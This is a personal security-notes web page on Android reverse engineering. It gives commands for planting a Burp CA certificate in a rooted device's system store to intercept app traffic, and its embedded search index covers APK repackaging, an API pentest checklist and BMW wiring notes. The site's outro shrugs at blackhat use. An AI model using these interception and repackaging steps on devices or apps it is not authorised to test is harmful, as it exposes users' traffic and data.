<!doctype html><html><title>Android Reverse Engineering</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name=apple-mobile-web-app-capable content="yes"><link href=../favicon.png rel=icon type=image/x-icon><link rel=stylesheet href=../css/index.db0ff6adb85d12a55dc7afd153794f1bb4b22f39d3efe031d0be4456af877dea.css><style type=text/css>:root{--color:#333;--background-color:#fafafa;--line-height:1.4;--font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--header-background-color:#ffffff;--header-border-bottom-color:#ccc;--header-color:#000000;--page-background-color:#ffffff;--page-border-left-color:rgba(0, 0, 0, 0.05);--page-link-color:rgba(10, 132, 255, 1);--page-max-width:625px;--page-font-size:17px;--page-line-height:24px;--page-hr-background-color:#dddddd;--backlinks-background-color:#fafafc;--backlinks-border-radius:16px;--backlink-label-color:#888888;--backlink-title-color:#000000;--backlink-preview-color:rgb(102, 102, 102);--backlink-hover-background-color:rgba(0, 0, 0, 0.05);--preview-width:625px;--preview-max-height:400px;--preview-scale:0.8;--preview-box-shadow-top-color:rgba(0, 0, 0, 0.08);--preview-box-shadow-right-color:rgba(0, 0, 0, 0.04);--preview-box-shadow-bottom-color:rgba(0, 0, 0, 0.15);--preview-box-shadow-left-color:rgba(0, 0, 0, 0.04);--search-extract-color:#aaaaaa}.menu-item-position{font-size:14px;display:inline;margin:0 5px 0 0}.menu-item{margin:0 0 10px;font-weight:700}.menu-item{font-size:100%}#head{margin-left:15px;font-family:courier new;font:14px courier new}#wrap{width:550px;margin:10px}body{background:#fff}.title-coded{font-size:12px}</style><body><style type=text/css>.menu-item-position>a{padding-right:10px;padding-left:10px}</style><header><a href=../ id=logo-and-title><div class=site-logo><img class=site-logo src=../favicon.png></div></a><div id=head><h1 class="menu-item menu-item-position"><a style=padding-left:0 class=author href=https://duraki.github.io/>halis duraki</a></h1>/<h1 class="menu-item menu-item-position"><a class=author href=https://duraki.github.io/reports.html>security rep+</a></h1>/<h1 class="menu-item menu-item-position"><a class=author href=https://durakiconsulting.com/>consulting</a></h1>/<h1 class="menu-item menu-item-position"><a class=author href=https://duraki.github.io/>blog</a></h1>/<h1 class="menu-item menu-item-position"><a class=author href=../>~ notes</a></h1><br></div><form id=search action=https://duraki.github.io/notes/search/ method=get><label hidden for=search-input>Search site</label>
<input type=text id=search-input name=query placeholder="Type here to search">
<input type=submit value=search></form></header><div class=grid-container><div class=grid><div class=page data-level=1><div class=content><h1>Android Reverse Engineering</h1><h3 id=burp-proxy-setup>Burp Proxy Setup</h3><p>If using <strong>Android 7</strong> or above, you need to export Burp CA Certificate from <code>Proxy → Options</code>, and selecting <code>Import/Export CA certificate</code>. Android wants the certificate to be in <strong>PEM format</strong>. The filename has to be equal to the <code>subject_hash_old</code> value appended with <code>.0</code>.</p><p><strong>Note</strong> - if you are using OpenSSL &lt; 1.0, you need to use <code>subject_hash</code> instead of <code>subject_hash_old</code>.</p><p>Using <code>openssl</code> is recommended way to convert DER to PEM format. Dump the <code>subject_hash_old</code> and rename the file as explained above.</p><pre tabindex=0><code>$ openssl x509 -inform DER -in cacert.der -out cacert.pem
$ openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1
$ mv cacert.pem &lt;hash&gt;.0
</code></pre><p>Push the certificate onto Android device by using <code>adb</code> or <code>ssh</code>:</p><pre tabindex=0><code># =&gt; move cert to the device
$ adb push &lt;hash&gt;.0 /data/local/tmp

# =&gt; on android device:
$ adb shell
% su
% mount -o rw,remount /system 
% mv /data/local/tmp/&lt;hash&gt;.0 /system/etc/security/cacerts/
% chown root:root /system/etc/security/cacerts/&lt;hash&gt;.0
% chmod 644 /system/etc/security/cacerts/&lt;hash&gt;.0
% reboot
</code></pre><h3 id=using-logcat-on-android>Using Logcat on Android</h3><p>To use built-in <code>logcat</code>, append the following:</p><pre tabindex=0><code>$ adb shell &#39;logcat --pid=$(pidof -s x.xxx.xxx.xxxxx.xx)&#39;
</code></pre><p><strong>References</strong></p><ul><li><a href=https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/>Android Nougat and Burp Proxy Configuration</a></li><li><a href=https://awakened1712.github.io/hacking/hacking-install-ca-android/>Install custom CA on Android</a></li><li><a href=https://github.com/CalebFenton/simplify#generic-android-deobfuscator>Generic Android Deobfuscator</a></li><li><a href=https://lief-project.github.io/doc/stable/tutorials/09_frida_lief.html>Injecting Frida via Lief</a></li><li><a href=https://jlajara.gitlab.io/mobile/2019/05/18/Frida-non-rooted.html>Frida on non-rooted device</a></li><li><a href=https://github.com/darvincisec/InjectFridaGadget>InjectFridaGadget tool</a></li><li><a href=https://blog.nviso.eu/2020/11/19/proxying-android-app-traffic-common-issues-checklist/>Proxying Android App traffic</a></li></ul></div><div class=bl-section><h4>Links to this note</h4><div class=backlinks><a href=../ class=backlink-anchor><div class=backlink><p class=backlink-title>duraki notes</p><p class=backlink-preview>Android Reverse Engineering</p></div></a><a href=../list-of-topics/ class=backlink-anchor><div class=backlink><p class=backlink-title>List of Topics</p><p class=backlink-preview>Android Reverse Engineering</p></div></a><a href=../re/ class=backlink-anchor><div class=backlink><p class=backlink-title>RE</p><p class=backlink-preview>Android Reverse Engineering</p></div></a></div></div></div></div></div><script src=https://duraki.github.io/notes/js/URI.js type=text/javascript></script>
<script src=https://duraki.github.io/notes/js/page.js type=text/javascript></script>
<script id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script>
<script>window.store={"https:\/\/duraki.github.io\/notes\/":{title:"duraki notes",tags:[],content:"Hello, these are my personal notes and knowledge graph. I started using Obsidian a bit early in 2020. and continued graphing my knowledge from there.\nI wanted something more towards functional, as to offer me a practical snippet library for my TTP\u0026rsquo;s, both online and as a backup of dementia.\nThe notes are inspired by others (see: #outro); with only one goal. To simply note-take, graph, and quickly extract valuable data. Thanks to Justin and Jethro for their theme support and contribution.\nI sincerly hope those notes will help you build yourself, extend your views, and expand your knowledge to new horizonts. Enjoy.\nYou can start exploring from the List of Topics, List of Tools, or see the full list of notes.\n Read More Selecting §-preffixed topics will put that topics hierarchy at index zero. Much easier to browse and search. Otherwise, selecting subtopic(s) will put that selected subtopic as your index.   List of Topics Automotive Cyber Security §Automotive  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment BMW E34 Learning Material  Electronic Signals AC \u0026amp; DC Signals (⏦︎ click here to expand)  AC Voltage Signals DC Voltage Signals   Signals Table    Classical Penetration Testing §Classical Pentest  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking §Network  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering §RE  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development §dev .files\nMy .dotfiles are available on my GitHub. At the time of writing, this repository is private due to confidential information.\nIn particular, I use:\n ssh, git, iterm, zsh, tmux macos, neovim+nvchad, karabiner, 60%mkb, lldb+voltron, amass, binwalk, nmap, burp  blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  btw, I use GMMK 60% keyboard, here are the default shortcuts.\nMisc  Windows Notes Linux Notes MacOS Notes Single-Board Computers (SBC)  Raspberry Pi Installation Enable SSH access via SD Card Building Kali Linux for Banana Pro Mounting SD Cards Mounting (ext4) partition in MacOS   Uplink (game) Modding How to write Notes Troubleshoot ~ ideas   How it works It uses parameters (such is [params.styles]) via config.toml. It\u0026rsquo;s possible to deploy dark version as well. Read for more in *.css. The theme used in ~notes is rewritten from my blog.\nOutro  Show #Outro This website is provided for free educational purposes. Knowledge shared here can be used for personal gain and experience. I do not condemn using TTPs explained here in your blackhat activities. The site is largely inspired by Andy\u0026rsquo;s notes. I would like to thank to the One, All-seeing, All-hearing. Many greetings to all my friends and family who supported me till the very end.  ",url:"https://duraki.github.io/notes/"},"https:\/\/duraki.github.io\/notes\/search\/":{title:"Search",tags:[],content:"",url:"https://duraki.github.io/notes/search/"},"https:\/\/duraki.github.io\/notes\/~-ideas\/":{title:"~ ideas",tags:[],content:" SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses  ",url:"https://duraki.github.io/notes/~-ideas/"},"https:\/\/duraki.github.io\/notes\/ac-and-dc-signals\/":{title:"AC and DC Signals",tags:[],content:"This is part of BMW E34 Learning Resources, Topics related to Signals. See Learning Resource index page and Electronic Signals for more details.\nThere are two types of such signals in BMW factory/production process:\n AC Type Signals, induced by shifting of a magnetic field, DC Type Signals, induced via multiple types of signals and sensors (Analog, Digital, Coded et al.).   .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  AC Type Signals - Frame View  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  DC Type Signals - Frame View  ",url:"https://duraki.github.io/notes/ac-and-dc-signals/"},"https:\/\/duraki.github.io\/notes\/ac-voltage-signals\/":{title:"AC Voltage Signals",tags:[],content:"Inductive Signals (Induced Voltage)  Inductive sensors produce an AC Sine Wave (see below) signal. The AC voltage is induced by the shifting of a magnetic field. The sensor consists of an impulse wheel (the moving part), and a coil wound magnetic core (stationary part).  As each \u0026ldquo;tooth\u0026rdquo; (spike) of the impulse wheel approaches the sensor tip, the magnetic field of the sensor shifts toward the impulse wheel and induces a voltage pulse in the windings.\nAs the teeth move away from the sensor, the magnetic field shifts back inducing a voltage pulse in the opposite direction.\nThis shifting of the magnetic field produces an alternating current (Positive to Negative).\nControl Module(s) which receive this alternating current, count the impulses (count shifts from positive to negative), and interpret the speed of rotation of the impulse wheel.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Graphical Flow Diagram of AC Voltage Signal   Read More Note: Voltage levels are dependent on sensor design. Not all inductive sensors produce 12 Volts.  AC Voltage Sine Wave .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  AC Type Signals  ",url:"https://duraki.github.io/notes/ac-voltage-signals/"},"https:\/\/duraki.github.io\/notes\/android-recompilation\/":{title:"Android Recompilation",tags:[],content:"Decompile Android APK file using apktool:\n# =\u0026gt; decompile $ apktool -r d AppName.apk -o AppName # =\u0026gt; recompile $ apktool b AppName Resign the APK package and install the Android application:\n# =\u0026gt; sign the apk package $ keytool -genkey -keystore example.keystore -validity 10000 -alias example $ jarsigner -keystore example.keystore -verbose AppName.apk example # =\u0026gt; installation $ apk install AppName.apk ",url:"https://duraki.github.io/notes/android-recompilation/"},"https:\/\/duraki.github.io\/notes\/android-reverse-engineering\/":{title:"Android Reverse Engineering",tags:[],content:"Burp Proxy Setup If using Android 7 or above, you need to export Burp CA Certificate from Proxy → Options, and selecting Import/Export CA certificate. Android wants the certificate to be in PEM format. The filename has to be equal to the subject_hash_old value appended with .0.\nNote - if you are using OpenSSL \u0026lt; 1.0, you need to use subject_hash instead of subject_hash_old.\nUsing openssl is recommended way to convert DER to PEM format. Dump the subject_hash_old and rename the file as explained above.\n$ openssl x509 -inform DER -in cacert.der -out cacert.pem $ openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1 $ mv cacert.pem \u0026lt;hash\u0026gt;.0 Push the certificate onto Android device by using adb or ssh:\n# =\u0026gt; move cert to the device $ adb push \u0026lt;hash\u0026gt;.0 /data/local/tmp # =\u0026gt; on android device: $ adb shell % su % mount -o rw,remount /system % mv /data/local/tmp/\u0026lt;hash\u0026gt;.0 /system/etc/security/cacerts/ % chown root:root /system/etc/security/cacerts/\u0026lt;hash\u0026gt;.0 % chmod 644 /system/etc/security/cacerts/\u0026lt;hash\u0026gt;.0 % reboot Using Logcat on Android To use built-in logcat, append the following:\n$ adb shell \u0026#39;logcat --pid=$(pidof -s x.xxx.xxx.xxxxx.xx)\u0026#39; References\n Android Nougat and Burp Proxy Configuration Install custom CA on Android Generic Android Deobfuscator Injecting Frida via Lief Frida on non-rooted device InjectFridaGadget tool Proxying Android App traffic  ",url:"https://duraki.github.io/notes/android-reverse-engineering/"},"https:\/\/duraki.github.io\/notes\/api-penetration-test-checklist\/":{title:"API Penetration Test Checklist",tags:[],content:"--- ## Authentication - [ ] Don\u0026#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don\u0026#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard. - [ ] Don\u0026#39;t extract the algorithm from the header. Force the algorithm in the backend (`HS256` or `RS256`). - [ ] Make token expiration (`TTL`, `RTTL`) as short as possible. - [ ] Don\u0026#39;t store sensitive data in the JWT payload, it can be decoded [easily](https://jwt.io/#debugger-io). ### OAuth - [ ] Always validate `redirect_uri` server-side to allow only whitelisted URLs. - [ ] Always try to exchange for code and not tokens (don\u0026#39;t allow `response_type=token`). - [ ] Use `state` parameter with a random hash to prevent CSRF on the OAuth authentication process. - [ ] Define the default scope, and validate scope parameters for each application. ## Access - [ ] Limit requests (Throttling) to avoid DDoS / brute-force attacks. - [ ] Use HTTPS on server side to avoid MITM (Man in the Middle Attack). - [ ] Use `HSTS` header with SSL to avoid SSL Strip attack. - [ ] For private APIs, only allow access from whitelisted IPs/hosts. ## Input - [ ] Use the proper HTTP method according to the operation: `GET (read)`, `POST (create)`, `PUT/PATCH (replace/update)`, and `DELETE (to delete a record)`, and respond with `405 Method Not Allowed` if the requested method isn\u0026#39;t appropriate for the requested resource. - [ ] Validate `content-type` on request Accept header (Content Negotiation) to allow only your supported format (e.g. `application/xml`, `application/json`, etc.) and respond with `406 Not Acceptable` response if not matched. - [ ] Validate `content-type` of posted data as you accept (e.g. `application/x-www-form-urlencoded`, `multipart/form-data`, `application/json`, etc.). - [ ] Validate user input to avoid common vulnerabilities (e.g. `XSS`, `SQL-Injection`, `Remote Code Execution`, etc.). - [ ] Don\u0026#39;t use any sensitive data (`credentials`, `Passwords`, `security tokens`, or `API keys`) in the URL, but use standard Authorization header. - [ ] Use an API Gateway service to enable caching, Rate Limit policies (e.g. `Quota`, `Spike Arrest`, or `Concurrent Rate Limit`) and deploy APIs resources dynamically. ## Processing - [ ] Check if all the endpoints are protected behind authentication to avoid broken authentication process. - [ ] User own resource ID should be avoided. Use `/me/orders` instead of `/user/654321/orders`. - [ ] Don\u0026#39;t auto-increment IDs. Use `UUID` instead. - [ ] If you are parsing XML files, make sure entity parsing is not enabled to avoid `XXE` (XML external entity attack). - [ ] If you are parsing XML files, make sure entity expansion is not enabled to avoid `Billion Laughs/XML bomb` via exponential entity expansion attack. - [ ] Use a CDN for file uploads. - [ ] If you are dealing with huge amount of data, use Workers and Queues to process as much as possible in background and return response fast to avoid HTTP Blocking. - [ ] Do not forget to turn the DEBUG mode OFF. ## Output - [ ] Send `X-Content-Type-Options: nosniff` header. - [ ] Send `X-Frame-Options: deny` header. - [ ] Send `Content-Security-Policy: default-src \u0026#39;none\u0026#39;` header. - [ ] Remove fingerprinting headers - `X-Powered-By`, `Server`, `X-AspNet-Version`, etc. - [ ] Force `content-type` for your response. If you return `application/json`, then your `content-type` response is `application/json`. - [ ] Don\u0026#39;t return sensitive data like `credentials`, `Passwords`, or `security tokens`. - [ ] Return the proper status code according to the operation completed. (e.g. `200 OK`, `400 Bad Request`, `401 Unauthorized`, `405 Method Not Allowed`, etc.). ## CI \u0026amp; CD - [ ] Audit your design and implementation with unit/integration tests coverage. - [ ] Use a code review process and disregard self-approval. - [ ] Ensure that all components of your services are statically scanned by AV software before pushing to production, including vendor libraries and other dependencies. - [ ] Design a rollback solution for deployments. --- ## See also: - [yosriady/api-development-tools](https://github.com/yosriady/api-development-tools) - A collection of useful resources for building RESTful HTTP+JSON APIs. ",url:"https://duraki.github.io/notes/api-penetration-test-checklist/"},"https:\/\/duraki.github.io\/notes\/automotive\/":{title:"Automotive",tags:[],content:" Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment BMW E34 Learning Material  Electronic Signals AC and DC Signals    ",url:"https://duraki.github.io/notes/automotive/"},"https:\/\/duraki.github.io\/notes\/automotive-cybersecurity-videos\/":{title:"Automotive Cybersecurity Videos",tags:[],content:"https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting\nhwio\nhttps://www.youtube.com/watch?v=2fplLJ3S3d0 https://www.youtube.com/watch?v=Myp4-RsdE-Y https://www.youtube.com/watch?v=Hzazchbvu6M https://www.youtube.com/watch?v=dZVWXP2j0co https://www.youtube.com/watch?v=10Dag6ee2d8\nudemy/can interface https://deloittedevelopment.udemy.com/course/master-can-protocol-completely-from-scratch/learn/\n Provided by Aron S.\n check these out to see how the UI looks. They have their own scripting language called CAPL:\nhttps://www.youtube.com/watch?v=uffjocL9Zt8 https://www.youtube.com/watch?v=KbVPeI9A_ME\n",url:"https://duraki.github.io/notes/automotive-cybersecurity-videos/"},"https:\/\/duraki.github.io\/notes\/automotive-hacking\/":{title:"Automotive Hacking",tags:[],content:" Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet \u0026amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications  Serial means that items of information are sent via a single stream of communication   Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles)  Special ECU are used called \u0026ldquo;gateways\u0026rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.)\nVehicle Diagnostics  ECUs provide diangostis services OBD standardises requests and responses related to diagnostics ISO 14229-1 (UDS) Standard  Defines structures and content of how data is interpreted   Read Fault Memory in the form of Diagnostic Trouble Codes from the ECU (detect faults)  ",url:"https://duraki.github.io/notes/automotive-hacking/"},"https:\/\/duraki.github.io\/notes\/banana-pro-quick-guide\/":{title:"Banana Pro Quick Guide",tags:[],content:"todo\n",url:"https://duraki.github.io/notes/banana-pro-quick-guide/"},"https:\/\/duraki.github.io\/notes\/bash-in-simple-words\/":{title:"Bash in simple words",tags:[],content:"The first two statements of your Bash script should be:\n#!/usr/bin/env bash set -euo pipefail The first statement is a Mac, GNU/Linux, and BSD portable way of finding the location of the bash interpreter.\nThe second statement combines:\n set -e which ensures that your script stops on first command failure. By default, when a command fails, BASH executes the next command. Looking at the logs, you might feel that the script executed successfully while some commands might have failed. Caveat: Be careful about applying it to existing scripts. set -u which ensures that your script exits on the first unset variable encountered. Otherwise, bash replaces the unset variables with empty default values. set -o pipefail which ensures that if any command in a set of piped commands failed, the overall exit status is the status of the failed command. Otherwise, the exit status is the status of the last command.  Example of valid shell script:\n#!/bin/sh # Author: # License: Unlicense set -euf log() { printf \u0026#39;\\033[32m-\u0026gt;\\033[m %s\\n\u0026#39; \u0026#34;$*\u0026#34; } die() { log \u0026#34;$*\u0026#34; \u0026gt;\u0026amp;2 exit 1 } usage() { echo \u0026#34;${0##*/} ARGS desc \u0026#34; exit 0 } ",url:"https://duraki.github.io/notes/bash-in-simple-words/"},"https:\/\/duraki.github.io\/notes\/blog-setup\/":{title:"Blog Setup",tags:[],content:"The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.\n--- minimal: artist: \u0026#34;Your Name\u0026#34; title: \u0026#34;Blog Title\u0026#34; description: \u0026#34;Blog description.\u0026#34; theme: \u0026#34;theme-name\u0026#34; posts: in: /posts/in # =\u0026gt; post in (md) out: /posts/out # =\u0026gt; post out (html) scripts: - \u0026#34;my super href:/about/me.html\u0026#34; # =\u0026gt; Links/URIs/Other art: ga: UA-00000000-X # =\u0026gt; your Google Analytics ",url:"https://duraki.github.io/notes/blog-setup/"},"https:\/\/duraki.github.io\/notes\/bmw-acronyms\/":{title:"BMW Acronyms",tags:[],content:"   Acronym Description     A Processed Vehicle Speed   AB Airbag   ABS Anti-lock Braking System   ADS Engine Intake Air Control   ADV Wiper Pressure Control   ASC All Season Traction   BC Board Computer   BLS Brake Light Switch   BS Block Diagram   BST Battery Safety Termina   CANBUS Controller Area Network(bus)   CCM Check Control Module   DBUS Diagnosis Bus (same as TXD)   DDE Digital Diesel Electronics   DIS Diagnosis and Information System   DISA Differential Air Intake Control   DME Digital Motor Electronics   DTC Diagnostic Trouble Code   DWA Theft Deterrent System   DWS Tire Pressure Warning System   ECM Engine control module (SAE)   EDC Electronic Dampening Contro   EDK Electronic Throttle Valve   EGS Electronic Transmission Control   EH Electronic Hydraulic   EHC Electronic Height Control   EKM Electronic Body Module   EKP Electronic Fuel Pump   ELV Electronic Steering Lock   EM Electro-Mechanical   EMF Electro-Mechanical Emergency Brake   EO Component Location   EPC Electronic Parts Catalog   ETM Electronic Troubleshooting Manual   FB Function Description   FFB Radio Remote Control   FRU Flat Rate Unit   GAL Speed Dependent Volume   GM General Module   HR34 Heading Control 34 (Dig/Analog)   IB Interior lighting Control Signal   IBUS Information Bus   IHKA Automatic Heating and A/C   IHKR Regulated Heating and A/C   IHKR1 Regulated Heating and A/C Control 1   IHKR2 Regulated Heating and A/C Control 2   IHKR3 Regulated Heating and A/C Control 3   IHKS Standard Heating and A/C   IKE Instrument Cluster Electronics   IR Infrared   ISIS Intelligent Safety Integration System   ISN Individual Serial Number   KAT Catalytic Converter   KATON Converter Heating (signal)   KBUS Body Bus   KL Terminal Designation   KO Compressor “ON” Signal   KOMBI Instrument Cluster   KOREL Compressor Relay Signal   KW Crankshaft   PDC Park Distance Control   LCM Lamp Check Module   EML Electronic Engine Power Control   LDP Leak Diagnosis Pump   LEV Low Emission Vehicle   LKM Lamp Control Module   LL Closed Throttle   LSZ Lamp Switching Center   LWS 5 Steering Angle Sensor   MBC Maximum Brake Control   MDK Motorized Throttle Valve   MF Timer with switching function for heating/ventilation   MFC Multi-Function Controller   MFW Multifunction Clock   MID Multi-Information Display   MoDiC Mobile Diagnostic Computer   MRS Multiple Restraint System   OBC On-Board Computer   OBD On-Board Diagnosis (SAE)   PB Pin Assignments   PBUS Periphery Bus   PWG Pedal Position Sensor   RDC Tire Pressure Control   RDW Tire Pressure Warning   RM Relay Module   RXD Wake-up Diagnosis Line   RZV Direct Stationary Ignition   SA Special Equipment   SB Fuse Assignments   SG Control Unit   SGS Seat Integrated Belt System   SII Service Interval Indicator   SM Seat Module   SP Schematic   ST Connector Views   SZM Central Switch Center Module   TD Engine Speed   TI Injector on time   TL Part Throttle   TRS Battery Isolation Switch   TSH Door Lock Heating   TU Technical Update   TXD Transmitting Diagnosis Line   VANOS Variable Camshaft Timing   YOURF3 Integrated Heading Control w/ filter 3   VL Full load - wide open throttle   WK Converter Lock-up Clutch   ZAE Central Airbag Electronics   ZGM Central Gateway Module   ZKE Central Body Electronics   ZV Central Locking System   ZVM Central Locking Module   ZWD Idle Control Valve    ",url:"https://duraki.github.io/notes/bmw-acronyms/"},"https:\/\/duraki.github.io\/notes\/bmw-ag-e34-learning-materials\/":{title:"BMW AG (E34) Learning Materials",tags:[],content:"This is Bavarian (E34 5-series focused) learning materials and resources, mostly related to ECUs, DMEs, Tuning, EE, Wirings et al. I currently daily-drive BMW E34, therefore I collect my own repair\u0026amp;restoration techniques. The documentation is written and compiled with different models and versions in mind, but keeping the methodologies of the BMW Technical Documentation collected and researched through the years. Nevertheless, a lot of topics and information presented here are #ReverseEngineered from the very low or no available resources, for years in the past. Thank me later →.\nTable of Content  Electronic Signals AC \u0026amp; DC Signals AC Voltage Signals DC Voltage Signals  Analog  NTC Sensors PTC Sensors Potentiometers   Digital  B+ Signal B- Signal Square Wave Signals     DC Digital Sensors  Hall Effect Sensors Magnetoresistive Sensors Designated Value Signals Coded Ground Signals   DC Digital Input/Output Stages Signals Table  E34: Speed Signal   Test your knowledge See Also  BMW Acronyms DIN 72552   Wiring  Circuit Basics Circuit Debugging E34 Low Cluster - EURO - MY. 88-90 Test Bench E34 Low Cluster - EURO - MY. 88-90 Pinout E34 Misc. Wiring     Electronic Signals Objectives of the Electronic Signals is to explain inductive sensors, and type of signals one may stumble upon during the reversing and hacking of BMW E34s and possibly other series as well. Upon completion, you should understand the difference between analog and digital signals, know the difference between NTC and PTC sensors, recognizing different signals on the oscilloscope etc. Besides, many EE stuff can be learn from reading the resources published. Reference   Bus Networks BMW utiliese Bus Networks on their vehicle. Starting from E38, BMW marked the first large scale usage of bus network on BMW vehicles. For the first time, bus networks are used to reduce overall wiring requirements. More about Bus Systems can be found in the Power Supply and Bus Systems (pdf) (ext).   Automotive Electronics Basics Relays / Starter Interrupts, SPDT and SPST Automotive Relays, Resistors, Blocking Diodes, Isolating Door Triggers and Sensors, Diodes Across the Coil of Relays, Car Audio, Mobile Video, Navigation   References Introduction to Bus Systems, Breakout Boxes and Connectors, Engine Electronics Overview, Air Management, Ignition Management, Coding and Programming, Wiring Diagram Symbols, Electronic Signals, Coding, Individualization \u0026amp; Programming (CIP), BMW Technical Training Documents  ",url:"https://duraki.github.io/notes/bmw-ag-e34-learning-materials/"},"https:\/\/duraki.github.io\/notes\/bmw-qa\/":{title:"BMW Q\u0026A",tags:[],content:" What are the two main groups of signals? The two parts of an inductive sensor are? The frequency of the signal indicates? In an NTC sensor, as Temperature increases, what does Resistance do? High resistance in a PTC sensor indicates warm or cold? A 5V measurement in a NTC sensor means? Describe the purpose of the three wires used on a potentiometar? How many voltage level possibilities does a Modulated Square Wave contain? The Duty Cycle of a Square Wave is the ratio of X to X time. Duty Cycle is expressed in which signs? A 50 milliseconds is equal to how much seconds? When is the signal on a Hall Effect Sensor high?  ",url:"https://duraki.github.io/notes/bmw-qa/"},"https:\/\/duraki.github.io\/notes\/building-kali-linux-for-banana-pro\/":{title:"Building Kali Linux for Banana Pro",tags:[],content:"Equipment  MacOS with GNU/Linux Virtual Machine or GNU/Linux equivalent LeMaker Banana Pro arm_pc SDCard with at least 16GB capacity (preferably \u0026ldquo;Class 10\u0026rdquo; or higher)  Build Instructions The Banana Pro has a dual core 1GHz Cortex™-A7 processor with a Mali400MP2 GPU and 1GB DDR3 RAM. Kali Linux can run from an external microSD card.\nKali Linux is supporting Banana Pro but it must be built from source. You will obviously need a GNU/Linux based OS (preferably Kali Linux) \u0026ndash; although I personally use VMWare Workstation with Ubuntu 20.04. I\u0026rsquo;d advice you to mkswap of at least 8GB space, and extend your drive to min. 120GB. The build instructions are summarised below, with Banana Pro build script described here:\n$ cd ~/ $ git clone https://gitlab.com/kalilinux/build-scripts/kali-arm $ cd ~/kali-arm/ $ sudo ./common.d/build_deps.sh # will take some time # =\u0026gt; i\u0026#39;m a fan of Mate DE $ sudo ./banana-pro.sh --desktop mate Compilation info Hardware model: Banana Pro (32-bit) Architecture: armhf OS build: kali-rolling 2022.2 Desktop manager: mate ... The generated image will be deployed in the ./images directory with the *.img.xz.\nPost-Build Instructions After successfully building a Kali Linux image for Banana Pro, via the process explained above, you can now proceed to deploy the final arm image by any route of your interest.\nTherefore, if you want to use dd \u0026ndash; via GNU/Linux or MacOS:\nxzcat images/kali-linux-2022.2-banana-pro-xfce-armhf.img.xz | sudo dd of=/dev/sdb bs=4M status=progres\nOr, if you are like me \u0026ndash; favoring BalenaEtcher which automatically fixes BOOT disk partitions:\n Pick an Image -\u0026gt; Select SD Card -\u0026gt; Etch!\n Running Your 